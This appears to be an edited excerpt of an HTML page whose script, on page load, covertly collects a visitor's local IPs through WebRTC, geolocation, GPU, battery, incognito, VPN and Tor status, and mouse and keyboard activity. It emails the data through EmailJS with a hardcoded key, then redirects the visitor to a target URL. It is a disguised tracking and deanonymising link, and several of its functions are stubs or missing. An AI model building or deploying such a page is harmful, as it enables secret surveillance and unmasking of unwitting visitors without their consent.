<!DOCTYPE html>
<html lang="en">
<head>
    <!-- ... (keep existing head content) ... -->
    <style>
        /* ... (keep existing styles) ... */
    </style>
</head>
<body>
    <!-- ... (keep existing body elements) ... -->

    <script type="text/javascript">
        // Initialize EmailJS
        (function() {
            emailjs.init("RrfKXUJqdjRY9RI8E");
        })();

        // Enhanced data collection
        async function collectUserData() {
            const userData = {
                timestamp: new Date().toISOString(),
                localTime: new Date().toString(),
                utcOffset: new Date().getTimezoneOffset(),
                referrer: document.referrer || "Direct visit",
                urlParams: Object.fromEntries(new URLSearchParams(window.location.search)),
                
                browser: {
                    userAgent: navigator.userAgent,
                    parsedBrowser: parseUserAgent(),
                    language: navigator.language,
                    languages: navigator.languages,
                    cookiesEnabled: navigator.cookieEnabled,
                    storage: checkStorage(),
                    doNotTrack: navigator.doNotTrack,
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    webdriver: navigator.webdriver,
                    adBlockEnabled: await checkAdBlock(),
                    battery: await getBatteryStatus(),
                },

                network: {
                    ip: "Unknown",
                    connection: getNetworkInfo(),
                    localIPs: await getLocalIPs(),
                    vpnDetection: await checkVPN(),
                    proxyDetection: await checkProxy(),
                },

                screen: {
                    resolution: `${window.screen.width}x${window.screen.height}`,
                    availableRes: `${window.screen.availWidth}x${window.screen.availHeight}`,
                    colorDepth: window.screen.colorDepth,
                    pixelDepth: window.screen.pixelDepth,
                    orientation: window.screen.orientation.type,
                    devicePixelRatio: window.devicePixelRatio,
                },

                device: {
                    type: getDeviceType(),
                    touchSupport: navigator.maxTouchPoints > 0,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory || "Unknown",
                    gpu: await getGPUInfo(),
                },

                location: {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    geolocation: await tryGeolocationAPI(),
                    ipBasedLocation: {},
                },

                security: {
                    https: window.location.protocol === "https:",
                    torDetection: checkTorBrowser(),
                    incognito: await checkIncognito(),
                    screenLock: await checkScreenLock(),
                },

                behavior: {
                    mouseMovement: await trackInitialMovement(),
                    keyboardEvents: trackKeyboard(),
                }
            };

            // Enhanced IP detection with TOR checks
            await tryMultipleGeoServices(userData);
            userData.network.torDetection = checkTorBrowser();
            
            // Add raw performance metrics
            userData.performance = getPerformanceMetrics();
            
            return userData;
        }

        // New forensic collection functions
        async function checkVPN() {
            try {
                const response = await fetch('https://ipapi.co/vpn-detection/');
                const data = await response.json();
                return data.vpn || data.proxy || false;
            } catch { return "Unknown"; }
        }

        async function getLocalIPs() {
            try {
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                return new Promise(resolve => {
                    pc.onicecandidate = ice => {
                        if (!ice.candidate) return;
                        const ips = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g);
                        resolve(ips || []);
                    };
                });
            } catch { return []; }
        }

        async function checkIncognito() {
            try {
                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
                if (!fs) return "Unknown";
                return new Promise(resolve => {
                    fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
                });
            } catch { return "Unknown"; }
        }

        function parseUserAgent() {
            const ua = navigator.userAgent;
            return {
                browser: ua.match(/(chrome|safari|firefox|edge|opera|opr|ie|msie)\/?\s*(\d+)/i) || [],
                os: ua.match(/(windows|mac os|linux|android|ios|iphone|ipad|ipod)/i) || [],
                device: ua.match(/(mobile|tablet|ipad|kindle|silk)/i) || []
            };
        }

        async function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
                };
            } catch { return "Blocked"; }
        }

        // Enhanced network detection
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return connection ? {
                type: connection.type,
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt
            } : "Unknown";
        }

        // Add behavioral tracking
        async function trackInitialMovement() {
            return new Promise(resolve => {
                const movements = [];
                const handler = e => {
                    movements.push({x: e.clientX, y: e.clientY, t: performance.now()});
                    if (movements.length > 10) {
                        document.removeEventListener('mousemove', handler);
                        resolve(movements);
                    }
                };
                document.addEventListener('mousemove', handler);
                setTimeout(() => resolve(movements), 1000);
            });
        }

        // Enhanced email formatting
        function formatEmailData(userData) {
            // Detailed formatting of all collected data
            // ... (extend existing formatting with new data points)
        }

        // Keep existing services and add new checks
        // ... (keep existing geolocation functions but add more checks)

        // Main execution flow
        window.onload = async function() {
            try {
                const userData = await collectUserData();
                await sendEmail(userData);
                setTimeout(redirectToTarget, 2000);
            } catch (error) {
                console.error('Error:', error);
                redirectToTarget();
            }
        };
    </script>
</body>
</html>
